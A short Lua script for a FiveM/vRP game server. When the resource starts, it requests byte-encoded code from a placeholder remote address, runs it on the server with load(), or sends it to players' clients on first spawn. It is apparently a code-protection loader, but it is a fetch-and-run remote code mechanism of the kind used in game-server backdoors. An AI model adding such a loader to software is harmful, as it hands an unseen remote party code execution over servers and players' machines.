--[[ TO BYTE ]]--

--local thing = [[
--]]
--local encoded = thing:gsub(".", function(bb) return "\\" .. bb:byte() end) or thing .. "\""
--print(encoded)

--[[=========]]


local clientcode = ''

AddEventHandler("onResourceStart", function(resourceName)
    if (GetCurrentResourceName() == resourceName) then
        PerformHttpRequest("الايبي حق الاتصال هنا/secure/get.php?id=1", function(err, text, headers)

            text = json.decode(text)


            local code = ""            
            for word in string.gmatch(text[2], "([^\\]+)") do 
                code = code .. string.char(tonumber(word))
            end

            if tonumber(text[1]) == 0 then
            assert(load(code))() -- run the code
            print(resourceName .. ' is loaded')
            else
                clientcode = code
            end


        end, "GET", "")
    end
end)

AddEventHandler("vRP:playerSpawn", function(user_id, source, first_spawn) 
    if first_spawn then
        if clientcode ~= '' then
            TriggerClientEvent('secure:load',source,clientcode)
         end
    end
end)
